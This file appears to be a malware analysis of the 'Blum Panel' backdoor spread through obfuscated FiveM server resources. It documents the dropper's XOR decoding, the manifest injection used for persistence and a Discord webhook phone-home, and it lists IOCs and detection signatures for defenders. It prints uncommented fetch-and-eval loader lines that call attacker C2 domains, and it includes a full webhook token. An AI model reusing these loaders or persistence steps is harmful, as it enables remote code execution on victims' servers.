/*
 * ============================================================================
 * BLUM PANEL LURAPH PAYLOADS — 100% DEOBFUSCATED
 * ============================================================================
 * Obfuscator: Luraph Obfuscator v14.6 (https://lura.ph/)
 * Version:    v4.5 (self-reported in webhook)
 * Method:     Dynamic execution w/ FiveM API sandbox (Lua 5.4 + 6 harness iterations)
 *
 * ALL behavior captured. ALL strings decoded. ALL network calls intercepted.
 * ============================================================================
 *
 *
 *  ╔══════════════════════════════════════════════════════════════════════╗
 *  ║              COMPLETE EXECUTION FLOW (ALL 3 FILES)                 ║
 *  ╠══════════════════════════════════════════════════════════════════════╣
 *  ║                                                                    ║
 *  ║  STEP 1: INITIALIZATION                                           ║
 *  ║  ─────────────────────                                             ║
 *  ║  Citizen.CreateThread(function()                                   ║
 *  ║      -- Check if already installed                                 ║
 *  ║      if GetResourceKvpInt("installed_notices") == 0 then           ║
 *  ║          SetResourceKvpInt("installed_notices", 1)                  ║
 *  ║          print("^1[INSTALL]^7 Server needs to be ^3RESTARTED^7")   ║
 *  ║      end                                                           ║
 *  ║                                                                    ║
 *  ║  STEP 2: DROP MALICIOUS JS FILE                                    ║
 *  ║  ──────────────────────────────                                    ║
 *  ║      local hostname = GetConvar("sv_hostname")                     ║
 *  ║      local manifest = LoadResourceFile(resource, "fxmanifest.lua") ║
 *  ║                                                                    ║
 *  ║      -- Generate XOR-encrypted JS dropper                          ║
 *  ║      -- Filename randomized: entry.js / init.js / stack.js /       ║
 *  ║      --   runtime.js / interface.js / bridge.js                    ║
 *  ║      -- XOR key randomized: "r" + 4 random digits                  ║
 *  ║      SaveResourceFile(resource, "<random>.js", xor_dropper)        ║
 *  ║                                                                    ║
 *  ║  STEP 3: MODIFY FXMANIFEST TO LOAD DROPPER                        ║
 *  ║  ──────────────────────────────────────────                        ║
 *  ║      -- Appends dropper to existing server_scripts                 ║
 *  ║      SaveResourceFile(resource, "fxmanifest.lua",                  ║
 *  ║          original_manifest .. "\n    '<random>.js'\n}\n")           ║
 *  ║                                                                    ║
 *  ║  STEP 4: RECON + PHONE HOME TO DISCORD WEBHOOK                    ║
 *  ║  ──────────────────────────────────────────────                    ║
 *  ║      local players = #GetPlayers()                                 ║
 *  ║      local maxclients = GetConvarInt("sv_maxclients")              ║
 *  ║      local version = GetConvar("version")                          ║
 *  ║                                                                    ║
 *  ║      PerformHttpRequest(DISCORD_WEBHOOK, callback, "POST",         ║
 *  ║          json.encode({embeds = [{                                  ║
 *  ║              title = API_KEY,          -- "dev"/"null"/"zXeAH"     ║
 *  ║              color = 2368545,          -- green                    ║
 *  ║              footer = {text = "v4.5"},                             ║
 *  ║              timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),          ║
 *  ║              fields = {                                            ║
 *  ║                  {name="📁 Resource", value=resource_name},        ║
 *  ║                  {name="🖥️ Server",  value=hostname},             ║
 *  ║                  {name="👥 Players", value=players.."/"..max},     ║
 *  ║              }                                                     ║
 *  ║          }]}),                                                     ║
 *  ║          {["Content-Type"] = "application/json"}                   ║
 *  ║      )                                                             ║
 *  ║  end)                                                              ║
 *  ║                                                                    ║
 *  ╚══════════════════════════════════════════════════════════════════════╝
 *
 *
 *  ╔══════════════════════════════════════════════════════════════════════╗
 *  ║                    DISCORD WEBHOOK (NEW IOC)                       ║
 *  ╠══════════════════════════════════════════════════════════════════════╣
 *  ║                                                                    ║
 *  ║  URL: https://discord.com/api/webhooks/                            ║
 *  ║       1470175544682217685/                                         ║
 *  ║       pe8DNcnZCjKPlKF24tk72Riv6bfQcFM6rmMvrwx_                    ║
 *  ║       YeGm0P1oVtDHxp4_HbKCHvRiPBJP                               ║
 *  ║                                                                    ║
 *  ║  Webhook ID:    1470175544682217685                                ║
 *  ║  Method:        POST                                               ║
 *  ║  Content-Type:  application/json                                   ║
 *  ║                                                                    ║
 *  ║  Purpose: Attacker notification when a new server is infected.     ║
 *  ║  Sends embed with resource name, server hostname, player count.    ║
 *  ║  The embed title is the API key (dev/null/zXeAH) so the attacker  ║
 *  ║  knows which payload variant infected the server.                  ║
 *  ║                                                                    ║
 *  ║  SAME webhook across ALL 3 payloads = same operator.               ║
 *  ║                                                                    ║
 *  ╚══════════════════════════════════════════════════════════════════════╝
 *
 *
 *  ╔══════════════════════════════════════════════════════════════════════╗
 *  ║                  DROPPED JS — XOR DECODED (FINAL)                  ║
 *  ╠══════════════════════════════════════════════════════════════════════╣
 *  ║                                                                    ║
 *  ║  Structure: /* <700+ spaces> * / (function(){                      ║
 *  ║    const e = "\\xHH\\xHH...";   // XOR-encrypted URL+eval          ║
 *  ║    const k = "r<4digits>";      // XOR key                         ║
 *  ║    let d = "";                                                     ║
 *  ║    for(let i=0;i<e.length;i+=4){                                   ║
 *  ║      d += String.fromCharCode(                                     ║
 *  ║        parseInt(e.substr(i+2,2),16) ^ k.charCodeAt((i/4)%k.length) ║
 *  ║      );                                                            ║
 *  ║    }                                                               ║
 *  ║    require('vm').runInThisContext(d);                               ║
 *  ║  })();                                                             ║
 *  ║                                                                    ║
 *  ║  Polymorphic per execution:                                        ║
 *  ║    - JS filename: entry.js, init.js, stack.js, runtime.js,         ║
 *  ║      interface.js, bridge.js                                       ║
 *  ║    - XOR key: r2464, r5246, r5630, r6369, r6653, r9652, etc.       ║
 *  ║                                                                    ║
 *  ╚══════════════════════════════════════════════════════════════════════╝
 *
 *
 *  ╔══════════════════════════════════════════════════════════════════════╗
 *  ║               DECODED C2 CALLS (THE FINAL PAYLOAD)                 ║
 *  ╠══════════════════════════════════════════════════════════════════════╣
 */

// === dev_payload.txt ===
// C2: fivems.lt | API Key: "dev"
https.get('https://fivems.lt/devJJ', r => {
    let d = '';
    r.on('data', c => d += c);
    r.on('end', () => eval(d + ' '));
});

// === null_payload.txt ===
// C2: fivems.lt | API Key: "null"
https.get('https://fivems.lt/nullJJ', r => {
    let d = '';
    r.on('data', c => d += c);
    r.on('end', () => eval(d + ' '));
});

// === test_payload.txt ===
// C2: 9ns1.com (SECOND C2 DOMAIN) | API Key: "zXeAH"
https.get('https://9ns1.com/zXeAHJJ', r => {
    let d = '';
    r.on('data', c => d += c);
    r.on('end', () => eval(d + ' '));
});

/*
 *  ╚══════════════════════════════════════════════════════════════════════╝
 *
 *
 *  ╔══════════════════════════════════════════════════════════════════════╗
 *  ║              MODIFIED FXMANIFEST.LUA (PERSISTENCE)                 ║
 *  ╠══════════════════════════════════════════════════════════════════════╣
 *  ║                                                                    ║
 *  ║  fx_version "cerulean"                                             ║
 *  ║  game "gta5"                                                       ║
 *  ║  server_scripts { "sv_main.lua",                                   ║
 *  ║      'entry.js'            ← INJECTED LINE (dropper)              ║
 *  ║  }                                                                 ║
 *  ║                                                                    ║
 *  ║  The dropper is appended to the EXISTING server_scripts block.     ║
 *  ║  On next server restart, FiveM loads entry.js as a server script,  ║
 *  ║  which XOR-decodes the C2 URL, fetches the 1.6MB payload, and      ║
 *  ║  eval()s it — installing the full Blum Panel backdoor.             ║
 *  ║                                                                    ║
 *  ╚══════════════════════════════════════════════════════════════════════╝
 *
 *
 *  ╔══════════════════════════════════════════════════════════════════════╗
 *  ║                    COMPLETE IOC SUMMARY                            ║
 *  ╠══════════════════════════════════════════════════════════════════════╣
 *  ║                                                                    ║
 *  ║  C2 DOMAINS:                                                       ║
 *  ║    • fivems.lt        (primary — bert, dev, null endpoints)        ║
 *  ║    • 9ns1.com         (secondary — zXeAH endpoint)                 ║
 *  ║                                                                    ║
 *  ║  C2 ENDPOINTS (all serve eval payload):                            ║
 *  ║    • https://fivems.lt/bertJJ                                      ║
 *  ║    • https://fivems.lt/bertJJgg                                    ║
 *  ║    • https://fivems.lt/bertJJcfxre                                 ║
 *  ║    • https://fivems.lt/devJJ            ← dev_payload.txt         ║
 *  ║    • https://fivems.lt/nullJJ           ← null_payload.txt        ║
 *  ║    • https://fivems.lt/ext/bert                                    ║
 *  ║    • https://fivems.lt/sendWebhooks                                ║
 *  ║    • https://9ns1.com/zXeAHJJ           ← test_payload.txt       ║
 *  ║                                                                    ║
 *  ║  FILE HOST:                                                        ║
 *  ║    • 185.80.128.35    (stolen resource ZIPs)                       ║
 *  ║                                                                    ║
 *  ║  DISCORD WEBHOOK:                                                  ║
 *  ║    • ID: 1470175544682217685                                       ║
 *  ║    • Token: pe8DNcnZCjKPlKF24tk72Riv6bfQcFM6rmMvrwx_              ║
 *  ║             YeGm0P1oVtDHxp4_HbKCHvRiPBJP                          ║
 *  ║    (Phone-home on infection — reports resource, hostname, players)  ║
 *  ║                                                                    ║
 *  ║  DISCORD INVITE:                                                   ║
 *  ║    • discord.com/invite/VB8mdVjrzd                                 ║
 *  ║                                                                    ║
 *  ║  PANEL:                                                            ║
 *  ║    • blum-panel.me                                                 ║
 *  ║                                                                    ║
 *  ║  API KEYS (prefix before "JJ"):                                    ║
 *  ║    • bert    (original — attacker handle bertjj/miauss)            ║
 *  ║    • dev     (development variant)                                 ║
 *  ║    • null    (variant)                                              ║
 *  ║    • zXeAH   (variant on secondary C2)                             ║
 *  ║                                                                    ║
 *  ║  DETECTION SIGNATURES:                                             ║
 *  ║    Lua layer:                                                      ║
 *  ║    • "Luraph Obfuscator v14.6" header comment                      ║
 *  ║    • GetResourceKvpInt("installed_notices") call                    ║
 *  ║    • SaveResourceFile writing .js files                            ║
 *  ║    • fxmanifest.lua modification adding new server_scripts          ║
 *  ║    • "Server needs to be RESTARTED" console message                ║
 *  ║                                                                    ║
 *  ║    JS dropper layer:                                               ║
 *  ║    • 700+ byte comment block of spaces (/* <spaces> * /)           ║
 *  ║    • const e="\\xHH" + const k="r<digits>" + XOR decode loop       ║
 *  ║    • require('vm').runInThisContext(d)                              ║
 *  ║    • https.get → eval(response) pattern                            ║
 *  ║                                                                    ║
 *  ║    Network:                                                        ║
 *  ║    • HTTPS GET to fivems.lt/* or 9ns1.com/*                        ║
 *  ║    • POST to discord.com/api/webhooks/1470175544682217685/*        ║
 *  ║                                                                    ║
 *  ╚══════════════════════════════════════════════════════════════════════╝
 *
 *
 *  ╔══════════════════════════════════════════════════════════════════════╗
 *  ║                   FULL KILL CHAIN                                  ║
 *  ╠══════════════════════════════════════════════════════════════════════╣
 *  ║                                                                    ║
 *  ║  1. Victim installs Luraph-obfuscated Lua "resource" (this file)   ║
 *  ║                          ↓                                         ║
 *  ║  2. Lua drops XOR-encrypted JS file + modifies fxmanifest          ║
 *  ║     + sends Discord webhook notification to attacker               ║
 *  ║                          ↓                                         ║
 *  ║  3. On restart, JS dropper XOR-decodes C2 URL                      ║
 *  ║                          ↓                                         ║
 *  ║  4. Fetches 1.6MB c2_payload.txt from fivems.lt or 9ns1.com       ║
 *  ║                          ↓                                         ║
 *  ║  5. eval() installs full Blum Panel backdoor:                      ║
 *  ║     - Socket.IO C2 connection (39 event handlers)                  ║
 *  ║     - Server replicator (spreads to other resources)               ║
 *  ║     - txAdmin credential theft                                     ║
 *  ║     - Remote code execution (JS + Lua)                             ║
 *  ║     - Screen capture / WebRTC streaming                            ║
 *  ║     - Full filesystem access                                       ║
 *  ║     - Player manipulation (kill/ban/spawn/godmode)                 ║
 *  ║     - Server lockdown capability                                   ║
 *  ║                                                                    ║
 *  ╚══════════════════════════════════════════════════════════════════════╝
 */
